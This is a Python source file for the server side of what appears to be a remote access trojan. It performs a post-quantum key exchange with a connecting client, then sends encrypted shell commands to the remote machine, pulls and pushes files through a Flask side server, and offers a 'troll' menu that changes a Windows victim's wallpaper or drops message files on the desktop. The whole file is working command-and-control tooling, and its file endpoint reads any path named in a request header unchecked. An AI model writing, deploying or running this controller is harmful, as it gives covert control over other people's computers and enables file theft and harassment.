#!/usr/bin/env python3

import argparse
import os
import socket

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from zstandard import ZstdCompressor, ZstdDecompressor
from cryptography.hazmat.primitives import hashes
from flask import Flask, jsonify, request
from kyber_py.ml_kem import ML_KEM_1024
import threading

key = None
nonce = None
downloads_folder = "downloads"
ip = '0.0.0.0' # Listen on all interfaces

app = Flask("File server")

def run_flask(port):
    app.run(ip, port)

@app.route('/d', methods=['POST'])
def download():
    data = decrypt(request.get_data())

    if not data:
        return jsonify({"error": "No data received"}), 400
    filename = request.headers.get('Filename')

    try:
        if not os.path.exists(downloads_folder):
            os.makedirs(downloads_folder)
                        
        output_path = os.path.join(downloads_folder, os.path.basename(filename))
        with open(output_path, "wb") as f:
            f.write(data)
        print("[Server] File downloaded successfully.")
        return jsonify({"message": "File downloaded successfully."}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500
    
@app.route('/u', methods=['POST'])
def upload():
    filename = request.headers.get('Filename')
    if not filename:
        return jsonify({"error": "Filename is missing"}), 400
    try:
        with open(filename, "rb") as f:
            data = f.read()
        file = encrypt(ZstdCompressor().compress(data))
        print("[Server] File uploaded successfully.")
        return file
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def troll_menu(client_socket):
    print("[Server] (ONLY WINDOWS ATM) Commands avaliable:")
    print("1-. Change wallpaper")
    print("2-. Create a file with message in desktop")
    print("3-. Play a video (not yet implemented)")
    print("4-. Open a link in MS Edge (not yet implemented)")
    user_input = input("[Server] Enter your choice: ").strip()

    if user_input == "1":
        wallpaper_path = input("[Server] Enter the wallpaper path you want to upload and set as background (JPEG, WEBP): ").strip()
        compressed_command = ZstdCompressor().compress(b'-wallpaper ' + wallpaper_path.encode("utf-8"))
        encrypted_command = encrypt(compressed_command)
        print("[Server] Wallpaper sent.")
    elif user_input == "2":
        file_name = input("[Server] Enter the name of the file: ").strip()
        file_message = input("[Server] Enter the message you want to write in the file: ").strip()
        compressed_command = ZstdCompressor().compress(b'-txt ' + file_name.encode("utf-8") + b'///' + file_message.encode("utf-8"))
        encrypted_command = encrypt(compressed_command)
        print("[Server] File sent.")
    return encrypted_command

def encrypt(data):
    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
    encryptor = cipher.encryptor()
    return encryptor.update(data)

def decrypt(data):
    cipher = Cipher(algorithms.ChaCha20(key, nonce), mode=None, backend=default_backend())
    decryptor = cipher.decryptor()
    return decryptor.update(data)

def start_server(port):
    global key, nonce

    mlkem = ML_KEM_1024
    server_public_key, server_private_key = mlkem.keygen()

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((ip, port))
    server.listen(1)
    print(f"[*] Listening on {ip}:{port}")
    client_socket, client_address = server.accept()
    print(f"[*] Connection established with {client_address}")

    try:
        client_socket.sendall(server_public_key)

        client_public_key_bytes = client_socket.recv(4096)
        shared_key = mlkem.decaps(server_private_key, client_public_key_bytes)

        derived_key = HKDF(
            algorithm=hashes.SHA256(),
            length=48,
            salt=None,
            info=b"handshake data",
            backend=default_backend(),
        ).derive(shared_key)

        key = derived_key[:32]
        nonce = derived_key[32:48]

        while True:
            command = input("\n[Server] Enter command: ").strip()
            compressed_command = ZstdCompressor().compress(command.encode("utf-8"))
            encrypted_command = encrypt(compressed_command)

            if command.lower() == "exit":
                client_socket.sendall(encrypted_command)
                client_socket.close()
                break
            elif command.lower() == "download":
                file_path = input("[Server] Enter file path to download: ")
                compressed_command = ZstdCompressor().compress(b'-download ' + file_path.encode("utf-8"))
                encrypted_command = encrypt(compressed_command)
            elif command.lower() == "upload":
                file_path = input("[Server] Enter file path to upload: ")
                compressed_command = ZstdCompressor().compress(b'-upload ' + file_path.encode("utf-8"))
                encrypted_command = encrypt(compressed_command)
            elif command.lower() == "troll":
                encrypted_command = troll_menu(client_socket)

            client_socket.sendall(encrypted_command)
            encrypted_response = client_socket.recv(4096)

            if not encrypted_response:
                break

            response = decrypt(encrypted_response)
            response = ZstdDecompressor().decompress(response).decode("utf-8")
            print(f"\n[Client]: {response}")

    except Exception as e:
        print(f"[!] Error: {e}")
        client_socket.close()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--port", type=int, default=5050, help="Port to bind (default: 5050)")
    arguments = parser.parse_args()

    flask_thread = threading.Thread(target=run_flask, args=(arguments.port + 1,), daemon=True)
    flask_thread.start()

    start_server(arguments.port)